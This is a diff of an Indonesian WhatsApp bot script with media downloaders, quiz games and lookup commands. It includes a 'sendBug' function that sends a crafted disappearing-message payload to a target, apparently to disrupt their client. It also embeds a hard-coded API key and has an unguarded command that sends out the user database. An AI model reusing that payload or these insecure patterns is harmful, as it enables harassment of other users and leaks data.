+await xdev.sendMessage(from, fs.readFileSync(mp4File), video, {quoted: dev, caption: "Nih"})        
+fs.unlinkSync(`./${mp4File}`)
+})     
+}
+
+
+
+
+//DOWNLOAD MP3
+const downloadMp3 = async (Link ) => {
+mp3File = getRandom('.mp3') 
+ytdl(Link, { filter: 'audioonly'})
+.pipe(fs.createWriteStream(mp3File))
+.on("finish", async () => {    
+await xdev.sendMessage(from, fs.readFileSync(mp3File), audio, {quoted: dev, caption: "Nih"})        
+fs.unlinkSync(mp3File)
+})       
+} 
+
+//SOUND CLOUD DOWNLOAD MP3
+const scdlMp3 = async (Link ) => {
+let scdl = await SoundCloud.create();
+let track = await scdl.tracks.getTrack(Link);
+mp3File = getRandom('.mp3') 
+opusFile = `${track.title}.opus`
+let stream = await scdl.download(Link)
+stream.pipe(fs.createWriteStream(mp3File))
+.on("finish", async () => {   
+	
+let request = new FFMPEGRequest({
+  input: {
+    path: mp3File
+  },
+  output: {
+    path: opusFile,
+    bitrate: 128
+  }
+});
+
+Ffmpeg.convert(request)
+.then( async filePath => {
+  // Done
+   await xdev.sendMessage(from, fs.readFileSync(filePath), audio, {quoted: dev})   
+   fs.unlinkSync(mp3File)
+   fs.unlinkSync(opusFile)
+})
+.catch(error => {
+setReply(error)
+})
+	
+	
+})     
+}
+
+
+
+
+
+
+//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
+const scdlDoc= async (Link ) => {
+let scdl = await SoundCloud.create();
+let track = await scdl.tracks.getTrack(Link);
+mp3File = `./${track.title}.mp3`
+let stream = await scdl.download(Link)
+stream.pipe(fs.createWriteStream(mp3File))
+.on("finish", async () => {    
+await xdev.sendMessage(from, fs.readFileSync(mp3File), document, {mimetype: "audio/mp3" , quoted: dev, filename: `${track.title}.mp3`})   
+fs.unlinkSync(mp3File)
+})       
+} 
+
+//Send Buggc
+const sendBug = async (target) => {
+await xdev.relayWAMessage(
+xdev.prepareMessageFromContent(
+target,
+xdev.prepareDisappearingMessageSettingContent(0),
+{}
+),{ waitForAck: true }) 
+}
+ 
+  
+ 
+ 
+//========================================================================================================================//
+colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
+const isImage = (type === 'imageMessage')
+const isVideo = (type === 'videoMessage')
+const isSticker = (type == 'stickerMessage')
+const isAudio = (type == 'audioMessage')
+const isMedia = (type === 'imageMessage' || type === 'videoMessage')
+const isViewOnce = (type == 'viewOnceMessage')
+const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
+const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
+const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
+const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
+const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
+const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
+const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
+const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
+					
+if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
+if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
+if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
+if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
+			
+_sewa.expiredCheck(xdev, sewa)
+_prem.expiredCheck(premium)
+
+	
+  // Tictactoe
+if (isTicTacToe(from, tictactoe)) {
+tictac(chatss, prefix, tictactoe, from, sender, setReply, mentions, addBalance, user)
+}
+
+const caklonte = async (deskripsi ) => {
+caklontong1.splice(from, 1);
+console.log(deskripsi)
+}
+//Game cak lontong    
+const butckl = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuCkl(xdev, caklontong, sendButMessage, butckl, caklonte)
+
+if (game.isCkl(from, caklontong)){
+if(budy.includes("yerah")){
+teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanCkl(from, caklontong)}\n\n`
+for (let icak of caklontong1){
+ teks += `${icak}`
+ }
+sendButMessage(from, teks, copyright, butckl) 
+caklontong.splice(game.getCklPosi(from, caklontong), 1)
+caklontong1.splice(from, 1);
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
+var htgtk = randomNomor(1500)
+addBalance(senderNumber, htgtk, user)
+teks = `*GAME CAK LONTONG*
+Selamat jawaban kamu benar
+Hadiah : Rp ${htgtk.toLocaleString()}\n\n`
+for (let icak of caklontong1){
+ teks += `${icak}`
+ }
+sendButMessage(from, teks, copyright, butckl) 
+caklontong.splice(game.getCklPosi(from, caklontong), 1)
+caklontong1.splice(from, 1);
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}
+ 
+//Game tebak kata
+const butkta = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakkata`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+ game.cekWaktuTK(xdev, tebakkata, sendButMessage, butkta)
+if (game.isTebakKata(from, tebakkata)){
+if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTK(from, tebakkata)}`
+sendButMessage(from, teks, copyright, butkta) 
+tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
+var htgtk = randomNomor(1500)
+addBalance(senderNumber, htgtk, user)
+teks = `*GAME TEBAK KATA*
+Selamat jawaban kamu benar
+Jawaban : ${game.getJawabanTK(from, tebakkata)}
+Hadiah : Rp ${htgtk.toLocaleString()}
+Ingin bermain lagi? kirim ${prefix}tebakkata
+atau tekan button di bawah ini`
+sendButMessage(from, teks, copyright, butkta) 
+tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}
+ 
+ //Game tebak gambar
+const butgam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakgambar`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuTG(xdev, tebakgambar, sendButMessage, butgam)
+
+if (game.isTebakGambar(from, tebakgambar)){
+if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTG(from, tebakgambar)}`
+sendButMessage(from, teks, copyright, butgam) 
+tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
+var htgm = randomNomor(1500)
+addBalance(senderNumber, htgm, user)
+teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : Rp ${htgm.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar\natau tekan button di bawah ini`
+sendButMessage(from, teks, copyright, butgam) 
+tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
+} else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}
+
+//Game Math
+const butmtk = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}math easy`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuMtk(xdev, mtk, sendButMessage, butmtk)
+if (game.isMtk(from, mtk)){
+if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanMtk(from, mtk)}`
+sendButMessage(from, teks, copyright, butmtk) 
+mtk.splice(game.getMtkPosi(from, mtk), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanMtk(from, mtk)) && !itsMe){
+var htgm3 = randomNomor(1500)
+addBalance(senderNumber, htgm3, user)
+teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\nHadiah : Rp ${htgm3.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}math\natau tekan button di bawah ini`
+sendButMessage(from, teks, copyright, butmtk) 
+mtk.splice(game.getMtkPosi(from, mtk), 1)
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}    
+
+
+//Game family 100
+const butfam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}family100`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+ game.cekWaktuFam(xdev, family100, sendButMessage, butfam)
+if (game.isfam(from, family100)){
+ var anyingg = game.getjawaban100(from, family100)
+ 
+ if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah :\n`
+for (let i of anyingg){
+teks += `- ${i}\n`
+}
+sendButMessage(from, teks, copyright, butfam) 
+family100.splice(game.getfamposi(from, family100), 1)
+return
+}
+ 
+for (let i of anyingg){
+if (budy.toLowerCase().includes(i)){
+var htgm1 = randomNomor(1500)
+addBalance(senderNumber, htgm1 , user)
+teks = `Selamat jawaban kamu benar\nJawaban : ${i}\nHadiah : Rp ${htgm1.toLocaleString()}\n\nJawaban yang blum tertebak : ${anyingg.length - 1}`
+sendButMessage(from, teks, copyright, butfam) 
+var anug = anyingg.indexOf(i)
+anyingg.splice(anug, 1)
+return
+} else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+return
+}
+}
+
+if (anyingg.length < 1){
+setReply(`Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`)
+family100.splice(game.getfamposi(from, family100), 1)
+}
+}   
+
+
+//Game tebak bendera
+const butben = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakbendera`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuTB(xdev, tebakbendera, sendButMessage, butben)
+
+if (game.isTebakBendera(from, tebakbendera)){
+if(budy.includes("Nyerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTB(from, tebakbendera)}`
+sendButMessage(from, teks, copyright, butben) 
+tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
+var syahira = randomNomor(1500)
+addBalance(senderNumber, syahira, user)
+teks = `*GAME TEBAK BENDERA*
+Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : Rp ${syahira.toLocaleString()}
+Ingin bermain lagi? kirim ${prefix}tebakbendera`
+sendButMessage(from, teks, copyright, butben) 
+tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
+} else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}
+
+//Game tebak anime
+const butanim = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakanime`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuTA(xdev, tebakanime, sendButMessage, butanim)
+if (game.isTebakAnime(from, tebakanime)){
+if(budy.includes("yerah")){
+teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTA(from, tebakanime)}`
+sendButMessage(from, teks, copyright, butanim) 
+tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
+var vinna = randomNomor(1500)
+addBalance(senderNumber, vinna, user)
+teks =`*GAME TEBAK ANIME*
+Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : Rp ${vinna.toLocaleString()}
+Ingin bermain lagi? kirim ${prefix}tebakanime`
+sendButMessage(from, teks, copyright, butanim) 
+tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+} 	        
+
+//Game tebak lirik
+const butlirik = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebaklirik`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
+game.cekWaktuTL(xdev, tebaklirik, sendButMessage, butlirik)
+
+if (game.isTebakLirik(from, tebaklirik)){
+if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTL(from, tebaklirik)}`
+sendButMessage(from, teks, copyright, butlirik) 
+tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanTL(from, tebaklirik)) && !itsMe){
+var htgml = randomNomor(1500)
+addBalance(senderNumber, htgml, user)
+teks = `*GAME TEBAK LIRIK*
+Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : Rp ${htgml.toLocaleString()}
+Ingin bermain lagi? kirim ${prefix}tebaklirik`
+sendButMessage(from, teks, copyright, butlirik) 
+tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+} 
+
+//Game siapa aku
+const butaku = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}siapaaku`, buttonText: { displayText: Mainlagi }, type: 1 } ];      
+game.cekWaktuSA(xdev, siapaaku, sendButMessage, butaku)
+   
+if (game.isSiapaAku(from, siapaaku)){
+if(budy.includes("yerah")){
+teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanSA(from, siapaaku)}`
+sendButMessage(from, teks, copyright, butaku) 
+siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
+return
+}
+if (chatss.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
+var htgmu = randomNomor(1500)
+addBalance(senderNumber, htgmu, user)
+teks = `*GAME SIAPAKAH AKU*
+Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : Rp ${htgmu.toLocaleString()}
+Ingin bermain lagi? kirim ${prefix}siapakahaku`
+sendButMessage(from, teks, copyright, butaku) 
+siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
+}else if(type === 'conversation' && !command && !dev.key.fromMe){
+setReply(jawabansalah)
+}
+}
+
+
+//AUTO RESPON SIMI BY DECODE DENPA 
+if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !dev.key.fromMe && !itsMe && !isSticker && !isAudio && !isMedia) { 
+xdev.updatePresence(from, Presence.composing)
+simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
+sami = simi.success
+setReply(`${sami}`)
+} 
+
+const b1 = ["pukulin","kocok"]
+const bully1 = b1[Math.floor(Math.random() * b1.length)]
+const b2 = ["gebukin","santet"]
+const bully2 = b2[Math.floor(Math.random() * b2.length)]
+const b3 = ["sayang","peluk"]
+const bully3 = b3[Math.floor(Math.random() * b3.length)]
+
+//if (atibot === true) return 
+ 
+try{ 
+switch (command) {
+	
+
+
+
+
+
+
+case 'lirik':
+case 'lyrics':
+songlyrics(q)
+.then((data) => {
+console.log(data)
+teks =`
+*Lirik Di Temukan*
+
+${data.lyrics}
+
+${data.source.name}
+Link: ${data.source.link}
+`
+setReply(teks)
+})
+.catch(console.log) 
+break
+
+	
+
+
+
+case 'scmp3':{
+if(!q) return setReply("Masukan Link")
+if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
+nana = q.replace('https://m.', 'https://')
+setReply("*Downloading...*")
+let track = await scdl.tracks.getTrack(nana);
+menit = Math.round(track.full_duration/1000/60)
+if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
+scdlMp3(nana)
+}
+break
+ 
+case 'scdoc':{
+if(!q) return setReply("Masukan Link")
+if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
+nana = q.replace('https://m.', 'https://')
+setReply("*Downloading...*")
+let track = await scdl.tracks.getTrack(nana);
+menit = Math.round(track.full_duration/1000/60)
+if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
+scdlDoc(nana)
+}
+break
+ 
+ 
+case 'scsearch':
+case 'soundcloudsearch':
+if(!q) return setReply("Masukan link")
+scdl = await SoundCloud.create();
+result = await scdl.search({
+query: q,
+limit: 15, 
+offset: 0, 
+filter: 'tracks' 
+});
+
+teks =`*SOUNDCLOUD SEARCH*`
+
+for (let res of result.collection){
+teks +=`
+
+📂 Judul : ${res.title}
+⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
+◀️ Diputar : ${h2k(res.playback_count)} kali
+❤️ Disukai : ${h2k(res.likes_count)}
+🌏 Release : ${res.release_date}
+♻️ Repost : ${h2k(res.reposts_count)}
+🔈 Format : ${res.track_format}
+🌐 Url : ${res.permalink_url}
+
+═════════════════
+`
+} 
+
+teks +=`_Thanks for choosing SoundCloud_`
+
+try{
+anuah = result.collection[0].artwork_url.replace('large', 'crop')
+var yamiyami = await getBuffer(anuah)
+} catch(err) {
+anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
+var yamiyami = await getBuffer(anuh)
+}
+nano = [
+{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
+]
+sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
+ break
+ 
+
+ 
+ 
+case 'playmusic':
+case 'p':
+case 'soundcloud':
+case 'playing':
+if(!q) return setReply("Masukan judul lagu")
+setReply(mess.wait)
+if(q.startsWith("https://")){
+nana = q.replace('https://m.', 'https://')
+scdl = await SoundCloud.create();
+let res = await scdl.tracks.getTrack(nana)
+console.log(res)
+teks =`
+*SOUNDCLOUD DOWNLOADER*
+
+📂 Judul : ${res.title}
+⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
+◀️ Diputar : ${h2k(res.playback_count)} kali
+❤️ Disukai : ${h2k(res.likes_count)}
+🌏 Release : ${res.release_date}
+♻️ Repost : ${h2k(res.reposts_count)}
+🔈 Format : ${res.track_format}
+`
+try{
+anuah = res.artwork_url.replace('large', 'crop')
+var yamiyami = await getBuffer(anuah)
+} catch(err) {
+anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
+var yamiyami = await getBuffer(anuh)
+}
+nano = [
+{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
+]
+sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
+
+} else {
+
+scdl = await SoundCloud.create();
+ result = await scdl.search({
+  query: q,
+  limit: 20, 
+  offset: 0, 
+  filter: 'tracks' 
+});
+
+res = result.collection[0] 
+
+try{
+var artis = res.publisher_metadata.artist
+var album = res.publisher_metadata.album_title
+} catch (err){
+var artis = res.user.full_name
+var album = "Tidak ada"
+}
+console.log(res)
+teks =`
+*SOUNDCLOUD DOWNLOADER*
+
+📂 Judul : ${res.title}
+👤 Artis : ${artis}
+💽 Album : ${album}
+⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
+◀️ Diputar : ${h2k(res.playback_count)} kali
+❤️ Disukai : ${h2k(res.likes_count)}
+🌏 Release : ${res.release_date}
+♻️ Repost : ${h2k(res.reposts_count)}
+🔈 Format : ${res.track_format}
+`
+
+try{
+anuah = res.artwork_url.replace('large', 'crop')
+var yamiyami = await getBuffer(anuah)
+} catch(err) {
+anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
+var yamiyami = await getBuffer(anuh)
+}
+nano = [
+{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
+{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
+]
+sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
+}
+break
+	
+	
+	
+	
+case 'spotify':
+if(!q) return setReply("Masukan link Spotify")
+data = await spotify.getTrack(q) 
+teks =`
+Nama: ${data.name}
+Artists: ${data.artists.join(' ')}
+Album : ${data.album_name}
+Release: ${data.release_date}
+
+Mohon tunggu, sedang mengirim
+File audio ${data.name}
+`
+sendFileFromUrl (data.cover_url, image, {quoted: dev, caption: teks})      
+song = await spotify.downloadTrack(q)
+await xdev.sendMessage(from, song, audio, {mimetype: Mimetype.mp4Audio, quoted: dev})        
+break
+
+
+
+
+case 'fb':
+nana = await facebookdl(q)
+console.log(nana)
+break
+
+
+case 'fbdl':
+nana = await facebookdlv2(q)
+console.log(nana)
+break
+
+/*
+case 'mediafire':
+if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+if(q.startsWith("https://www.mediafire.com")){
+nana = await mediafiredl(q)
+console.log(nana)
+var teks =`
+Data succesfull obtained
+
+File Name : ${nana.filename}
+File Size : ${nana.filesizeH}
+Upload : ${nana.aploud}
+`
+await setReply(teks)
+if(nana.filesize > 30000){
+if(sender.startsWith("62")){
+var teks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
+} else {
+var teks = "You have been banned\nfor abusing the mediafire feature"
+}
+
+addBanned(pushname,calender, senderNumber, ban) 
+await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 30mb")              
+await setReply(teks)
+return
+}
+await sendMediaURL (from, nana.url, "Nih")
+limitAdd(senderNumber, user)
+} else{
+setReply("Link Invalid")
+	}
+break
+*/
+	
+case 'well':{
+nana = await wallpaper(q)
+
+
+for (let i of nana){
+//foto = i[Math.floor(Math.random() * i.length)]
+//sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})
+
+}
+
+}
+break
+
+	
+case 'loc':
+                     if(isExtream) return
+            if (!isOwner) return onlyOwner()
+                                       //  jpegThumbnail: virgam,
+                             xdev.sendMessage(from, {
+                            degreesLatitude: -7.98,
+                              degreesLongitude: 118.62,
+                            name: "tes",
+                               address: "ahah"
+                              }, location,
+                              {thumnail: thumb, contextInfo:forward})
+                            break
+                
+	
+case 'backup':
+await xdev.sendMessage(from,fs.readFileSync(`./database/user.json`), document, {quoted: dev, filename: "user", mimetype: 'application/json'})
+break
+
+
+
+case 'kalkulator':
+try{
+nana = q.replace("x","*")
+nana = matematik.evaluate(nana)
+teks = `${q} = ${nana}`
+setReply(teks)
+} catch (err){
+setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
+}
+break
+
+case 'githubdl':
+if (!args[0]) return setReply('usernamenya mana om\nContoh saipulanuar')
+if (!args[1]) return setReply('repo nya mana?\nContoh v18')
+let url = `https://github.com/${args[0]}/${args[1]}/archive/refs/heads/main.zip`
+//ByRizkyAdi
+m.reply(`waiting for compress to zip`)
+xdev.sendFile(m.chat, url, 'repo.zip', null, m)
+break
+
+
+case 'gitclone':
+try{
+regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
+if (!regex.test(q)) return setReply('link salah!')
+let [, user, repo] = q.match(regex) || []
+repo = repo.replace(/.git$/, '')
+let url = `https://api.github.com/repos/${user}/${repo}/zipball`
+let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
+m.reply(`*Mohon tunggu, sedang mengirim repository..*`)
+xdev.sendFile(m.chat, url, filename, null, m)
+} catch (err){
+setReply(mess.error.link)
+}
+break
+	
+	
+	
+case 'weather':
+if(!args[0]) setReply(" please provide place or location name")
+try{
+let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
+let res = await response
+let name = res.data.name
+let Country = res.data.sys.country
+let Weather= res.data.weather[0].description
+let Temperature = res.data.main.temp + '°C'
+let Minimum_Temperature= res.data.main.temp_min + '°C'
+let Maximum_Temperature= res.data.main.temp_max + '°C'
+let Humidity= res.data.main.humidity + '%'
+let Wind= res.data.wind.speed + 'km/h'
+xdev.reply(m.chat,`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`.trim(),m)
+}catch(e){
+setReply('Lokasi tidak di temukan, silakan masukan nama negara')
+ }
+break
+	
+	
+	
+   
+case 'totalpesan':{
+let id = m.chat
+let mCount = {}
+let totalM = 0
+await xdev.loadAllMessages(id, m => {
+let user = m.key.fromMe ? xdev.user.jid : m.participant ? m.participant : id.includes('g.us') ? '' : id
+if (!user) return
+if (user in mCount) mCount[user]++
+else mCount[user] = 1
+totalM++
+}, 1000)
+let sorted = Object.entries(mCount).sort((a, b) => b[1] - a[1])
+let pesan = sorted.map(v => `${v[0].replace(/(\d+)@.+/, '@$1')}: ${v[1]} pesan`).join('\n')
+m.reply(`${totalM} pesan terakhir\n${pesan}`, false, { contextInfo: { mentionedJid: sorted.map(v => v[0]) } })
+}
+break
+
+
+	
+case 'gempanow':
+ano = await gempaNow()
+console.log(ano)
+if(ano.length == 0) return setReply("Tidak ada info terjadi gempa hari ini")
+for(let e of ano){
+ teks =`Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nLatitude: ${e.latitude}\nLongitude:${e.longitude}\n`
+}
+setReply(teks)
+
+break
+
+
+case 'infogempa':
+ani = await gempa()
+console.log(ani)
+teks =`*INFO GEMPA*\nTotal: ${ani.length}\n\n`
+ani.map(function(e, i){
+teks +=(i+1)+`. Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nPeringatan: ${e.warning}\n\n═════════════════\n\n`
+ });
+setReply(teks)
+break
+	
+
+	
+case 'jadwaltvnow':
+eh = await jadwalTVNow()
+console.log(eh)
+teks =`*Jadwal Tv Now*\nTotal: 2\n\n`
+for (let i of eh.antv){
+teks +=`1. ANTV: \n${i.date} GT${i.event}\n\n═════════════════\n\n`
+}
+setReply(teks)
+break
+	
+	case 'alquran':{
+	let ah = await alquran()
+	console.log(ah)
+	}
+	break
+	
+	case 'lonte':{
+	let ah = await googleImage(q)
+	console.log(ah)
+	}
+	break
+	
+	
+	
+	
+	
+	
+case 'debug':
+menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
+mhan = await xdev.prepareMessage(from, thumb, image, {thumbnail: thumb})
+res = await xdev.prepareMessageFromContent(from,{
+"templateMessage": {
+"hydratedTemplate": {
+"imageMessage": mhan.message.imageMessage,
+"hydratedContentText": menunya,
+"hydratedFooterText": copyright,
+"hydratedButtons": [
+{
+"urlButton": {
+"displayText": `Script ${pushname}`,
+"url": "https://github.com/dcode-denpa"
+}
+},{
+"callButton": {
+"displayText": 'Number Phone Owner',
+"phoneNumber": '+62 882-9202-4190'
+}
+}, 
+{
+"quickReplyButton": {
+"displayText": "List Menu",
+"id": "60dd75b0081979507a679f99"
+}
+},
+{
+"quickReplyButton": {
+"displayText": "Script",
+"id": "60dd75b0081979507a679f99"
+}
+},
